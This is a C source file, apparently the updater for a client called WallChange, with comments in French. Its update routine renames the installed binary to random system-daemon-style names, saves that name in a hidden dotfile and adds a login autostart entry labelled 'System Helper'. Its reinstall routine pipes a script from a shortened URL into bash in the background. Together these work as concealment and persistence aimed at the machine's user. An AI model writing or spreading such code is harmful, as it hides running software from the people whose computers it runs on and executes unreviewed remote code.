#include "client/updater.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <time.h>
#include <sys/stat.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define CMD_MAX 8192
#define UNUSED(x) (void)(x)

static inline void run_cmd(const char *cmd) {
    int ret = system(cmd);
    UNUSED(ret);
}

void perform_update() {
    printf("Mise à jour demandée...\n");
    
    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Erreur: Impossible de récupérer HOME.\n");
        return;
    }

    if (chdir(home) == 0) {
        setenv("PWD", home, 1);
        printf("Répertoire de travail changé vers: %s\n", home);
    } else {
        if (chdir("/tmp") == 0) {
            setenv("PWD", "/tmp", 1);
            printf("Répertoire de travail changé vers: /tmp\n");
        } else {
            perror("chdir failed");
        }
    }

    // 1. Définir le dossier du dépôt (persistant)
    char temp_dir[PATH_MAX];
    snprintf(temp_dir, sizeof(temp_dir), "%s/.wallchange_source", home);
    
    int need_clone = 1;
    struct stat st;
    
    // Vérifier si le dossier existe
    if (stat(temp_dir, &st) == 0 && S_ISDIR(st.st_mode)) {
        printf("Dossier source existant trouvé: %s\n", temp_dir);
        
        // Tenter une mise à jour
        char update_cmd[CMD_MAX];
        snprintf(update_cmd, sizeof(update_cmd), 
                 "cd '%s' && git fetch origin master && git reset --hard origin/master", 
                 temp_dir);
                 
        if (system(update_cmd) == 0) {
            need_clone = 0;
            printf("Mise à jour du dépôt réussie.\n");
        } else {
            printf("Échec de la mise à jour du dépôt. Suppression et reclonage...\n");
            char rm_cmd[CMD_MAX];
            snprintf(rm_cmd, sizeof(rm_cmd), "rm -rf '%s'", temp_dir);
            run_cmd(rm_cmd);
        }
    }
    
    if (need_clone) {
        printf("Clonage du dépôt dans %s...\n", temp_dir);
        char clone_cmd[CMD_MAX];
        snprintf(clone_cmd, sizeof(clone_cmd), 
                 "git clone --depth 1 -b master https://github.com/Zeky69/WallChange.git '%s'", 
                 temp_dir);
        
        if (system(clone_cmd) != 0) {
            fprintf(stderr, "Erreur: Impossible de cloner le dépôt.\n");
            return;
        }
    }

    // 3. Sauvegarder le chemin de l'exécutable actuel
    char current_exe[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", current_exe, sizeof(current_exe) - 1);
    if (len == -1) {
        perror("readlink failed");
        // run_cmd(rm_cmd);
        return;
    }
    current_exe[len] = '\0';

    // 4. Se déplacer dans le dossier temporaire
    printf("Changement de répertoire vers %s\n", temp_dir);
    if (chdir(temp_dir) != 0) {
        perror("chdir failed");
        // run_cmd(rm_cmd);
        return;
    }
    
    // 5. Recompile
    printf("Compilation...\n");
    if (system("make") != 0) {
        printf("Erreur lors de la compilation.\n");
        // run_cmd(rm_cmd);
        return;
    }
    
    // 6. Lire le nom du processus actuel depuis le fichier de config
    char process_name_file[PATH_MAX];
    char process_name[256] = "";
    snprintf(process_name_file, sizeof(process_name_file), "%s/.zlsw", home);
    
    FILE *pf = fopen(process_name_file, "r");
    if (pf) {
        if (fgets(process_name, sizeof(process_name), pf)) {
            // Supprimer le newline
            size_t plen = strlen(process_name);
            if (plen > 0 && process_name[plen - 1] == '\n') {
                process_name[plen - 1] = '\0';
            }
        }
        fclose(pf);
    }
    
    // 7. Générer un nouveau nom de processus aléatoire
    char new_process_name[256];
    const char *prefixes[] = {"sys", "usr", "lib", "dbus", "gvfs", "gnome", "kde", "xdg", "pulse", "pipe", "session", "desktop", "display", "input", "audio", "video", "notify", "update", "sync", "cache"};
    const char *suffixes[] = {"helper", "daemon", "service", "worker", "monitor", "agent", "manager", "handler", "launcher", "watcher", "server", "client", "bridge", "proxy", "wrapper"};
    
    srand(getpid() ^ time(NULL));
    int prefix_idx = rand() % 20;
    int suffix_idx = rand() % 15;
    int random_num = rand() % 10000;
    
    snprintf(new_process_name, sizeof(new_process_name), "%s-%s-%04d", 
             prefixes[prefix_idx], suffixes[suffix_idx], random_num);
    
    printf("Nouveau nom de processus: %s\n", new_process_name);
    
    // 8. Sauvegarder le nouveau nom
    pf = fopen(process_name_file, "w");
    if (pf) {
        fprintf(pf, "%s\n", new_process_name);
        fclose(pf);
    }
    
    // 9. Copier le nouveau binaire avec le nouveau nom
    char install_dir[512];
    snprintf(install_dir, sizeof(install_dir), "%s/.local/bin", home);
    
    char new_binary_path[1024];
    snprintf(new_binary_path, sizeof(new_binary_path), "%s/%s", install_dir, new_process_name);
    
    // NOTE: On ne supprime PAS l'ancien binaire maintenant car on est peut-être 
    // en train de l'exécuter. On le supprimera après avoir copié le nouveau.
    
    printf("Installation du nouveau binaire: %s\n", new_binary_path);
    char cp_cmd[CMD_MAX];
    snprintf(cp_cmd, sizeof(cp_cmd), "cp '%s/wallchange' '%s' && chmod +x '%s'", 
             temp_dir, new_binary_path, new_binary_path);
    
    if (system(cp_cmd) != 0) {
        fprintf(stderr, "Erreur lors de la copie du binaire.\n");
        // run_cmd(rm_cmd);
        return;
    }

    // Nettoyage de l'ancien binaire
    if (strlen(process_name) > 0 && strcmp(process_name, new_process_name) != 0) {
        char old_binary_path[1024];
        snprintf(old_binary_path, sizeof(old_binary_path), "%s/%s", install_dir, process_name);
        printf("Suppression de l'ancien binaire: %s\n", old_binary_path);
        unlink(old_binary_path);
    }

    // 9.5 Créer un lien symbolique 'wallchange' vers le nouveau binaire
    // Cela permet à la commande 'wallchange' de toujours fonctionner
    char symlink_path[1024];
    snprintf(symlink_path, sizeof(symlink_path), "%s/wallchange", install_dir);
    
    // Supprimer l'ancien lien ou fichier s'il existe
    unlink(symlink_path);
    
    // Créer le nouveau lien symbolique
    if (symlink(new_binary_path, symlink_path) != 0) {
        perror("Erreur lors de la création du lien symbolique wallchange");
        // Fallback: copier le fichier si le lien échoue
        char cp_link_cmd[CMD_MAX];
        snprintf(cp_link_cmd, sizeof(cp_link_cmd), "cp '%s' '%s'", new_binary_path, symlink_path);
        if (system(cp_link_cmd) != 0) {
            fprintf(stderr, "Erreur lors de la copie fallback.\n");
        }
    } else {
        printf("Lien symbolique 'wallchange' mis à jour.\n");
    }
    
    // 10. Mettre à jour le fichier autostart
    char autostart_file[PATH_MAX];
    snprintf(autostart_file, sizeof(autostart_file), "%s/.config/autostart/wallchange.desktop", home);
    
    FILE *af = fopen(autostart_file, "w");
    if (af) {
        fprintf(af, "[Desktop Entry]\n");
        fprintf(af, "Type=Application\n");
        fprintf(af, "Exec=/bin/bash -c 'PNAME=$(cat %s 2>/dev/null); if [ -n \"$PNAME\" ] && [ -f \"%s/$PNAME\" ]; then \"%s/$PNAME\"; fi'\n", 
                process_name_file, install_dir, install_dir);
        fprintf(af, "Hidden=false\n");
        fprintf(af, "NoDisplay=false\n");
        fprintf(af, "X-GNOME-Autostart-enabled=true\n");
        fprintf(af, "Name=System Helper\n");
        fprintf(af, "Comment=System session helper\n");
        fclose(af);
    }
    
    // 11. Nettoyage (Optionnel, on garde le repo pour la prochaine fois)
    printf("Nettoyage...\n");
    
    // Revenir au dossier HOME
    if (chdir(home) == 0) {
        setenv("PWD", home, 1);
    }
    
    // On ne supprime plus le dossier source pour permettre les mises à jour incrémentales
    
    // 12. Supprimer les anciens binaires MAINTENANT (après avoir copié le nouveau)
    // Supprimer l'ancien binaire avec nom aléatoire si existant
    if (strlen(process_name) > 0) {
        char old_binary_path[1024];
        snprintf(old_binary_path, sizeof(old_binary_path), "%s/%s", install_dir, process_name);
        // Ne supprimer que si différent du nouveau
        if (strcmp(old_binary_path, new_binary_path) != 0) {
            unlink(old_binary_path);
        }
    }
    
    // Supprimer aussi le binaire wallchange (anciennes installations)
    // char old_wallchange[1024];
    // snprintf(old_wallchange, sizeof(old_wallchange), "%s/wallchange", install_dir);
    // // Ne supprimer que si différent du nouveau
    // if (strcmp(old_wallchange, new_binary_path) != 0) {
    //     unlink(old_wallchange);
    // }
    
    // 13. Restart avec le nouveau binaire
    printf("Redémarrage du client...\n");
    
    char *args[] = {new_binary_path, NULL};
    execv(new_binary_path, args);
    
    // Si execv échoue
    perror("execv failed");
}

void perform_uninstall() {
    printf("Désinstallation de WallChange...\n");
    
    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Erreur: Impossible de récupérer HOME.\n");
        exit(1);
    }

    // 1. Arrêter les processus
    // Arrêter le processus avec nom aléatoire
    char process_name_file[PATH_MAX];
    char process_name[256] = "";
    snprintf(process_name_file, sizeof(process_name_file), "%s/.zlsw", home);
    
    FILE *pf = fopen(process_name_file, "r");
    if (pf) {
        if (fgets(process_name, sizeof(process_name), pf)) {
            size_t plen = strlen(process_name);
            if (plen > 0 && process_name[plen - 1] == '\n') {
                process_name[plen - 1] = '\0';
            }
        }
        fclose(pf);
    }
    
    // Arrêter le processus avec nom aléatoire
    if (strlen(process_name) > 0) {
        char kill_cmd[CMD_MAX];
        snprintf(kill_cmd, sizeof(kill_cmd), "pkill -f '%s' 2>/dev/null", process_name);
        run_cmd(kill_cmd);
    }
    
    // Arrêter aussi le processus wallchange (anciennes installations)
    run_cmd("pkill -x wallchange 2>/dev/null");

    // 2. Supprimer le binaire avec le nom aléatoire
    if (strlen(process_name) > 0) {
        char random_bin[1024];
        snprintf(random_bin, sizeof(random_bin), "%s/.local/bin/%s", home, process_name);
        if (access(random_bin, F_OK) == 0) {
            printf("Suppression du binaire: %s\n", random_bin);
            unlink(random_bin);
        }
    }

    // 3. Supprimer le fichier de nom de processus
    if (access(process_name_file, F_OK) == 0) {
        printf("Suppression du fichier de configuration: %s\n", process_name_file);
        unlink(process_name_file);
    }

    // 4. Supprimer le fichier autostart
    char autostart_file[1024];
    snprintf(autostart_file, sizeof(autostart_file), "%s/.config/autostart/wallchange.desktop", home);
    if (access(autostart_file, F_OK) == 0) {
        printf("Suppression du fichier autostart: %s\n", autostart_file);
        unlink(autostart_file);
    }

    // 5. Supprimer les anciens binaires dans ~/.local/bin (wallchange, server)
    char wallchange_bin[1024];
    snprintf(wallchange_bin, sizeof(wallchange_bin), "%s/.local/bin/wallchange", home);
    if (access(wallchange_bin, F_OK) == 0) {
        printf("Suppression du binaire: %s\n", wallchange_bin);
        unlink(wallchange_bin);
    }
    
    char server_bin[1024];
    snprintf(server_bin, sizeof(server_bin), "%s/.local/bin/server", home);
    if (access(server_bin, F_OK) == 0) {
        printf("Suppression du binaire: %s\n", server_bin);
        unlink(server_bin);
    }

    // 6. Supprimer l'exécutable actuel (si différent)
    char current_exe[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", current_exe, sizeof(current_exe) - 1);
    if (len != -1) {
        current_exe[len] = '\0';
        // Ne pas supprimer si c'est le même que wallchange_bin
        if (strcmp(current_exe, wallchange_bin) != 0) {
            printf("Suppression de l'exécutable actuel: %s\n", current_exe);
            unlink(current_exe);
        }
    }

    // 7. Supprimer les alias dans ~/.zshrc et ~/.bashrc
    char zshrc[1024];
    char bashrc[1024];
    snprintf(zshrc, sizeof(zshrc), "%s/.zshrc", home);
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", home);

    const char *files[] = {zshrc, bashrc, NULL};
    for (int i = 0; files[i] != NULL; i++) {
        if (access(files[i], F_OK) == 0) {
            printf("Suppression des alias dans: %s\n", files[i]);
            char cmd[CMD_MAX];
            snprintf(cmd, sizeof(cmd), 
                     "sed -i '/# Alias Wallchange/d; /alias wallchange=/d; /alias wallserver=/d' '%s'",
                     files[i]);
            run_cmd(cmd);
        }
    }

    printf("\n=== Désinstallation terminée ===\n");
    printf("Au revoir !\n");
    exit(0);
}

void perform_reinstall() {
    printf("Réinstallation complète demandée...\n");
    printf("Lancement du script d'installation...\n");
    
    // Lancer l'installation en arrière-plan et se détacher
    // On utilise nohup pour survivre à la fermeture du terminal/processus parent
    // et on redirige les sorties pour éviter de bloquer
    int ret = system("nohup /bin/bash -c 'curl -L \"https://link.codeky.fr/wall\" | bash' > /dev/null 2>&1 &");
    
    if (ret == 0) {
        printf("Script d'installation lancé. Arrêt du client...\n");
        exit(0);
    } else {
        fprintf(stderr, "Erreur lors du lancement de la réinstallation.\n");
    }
}
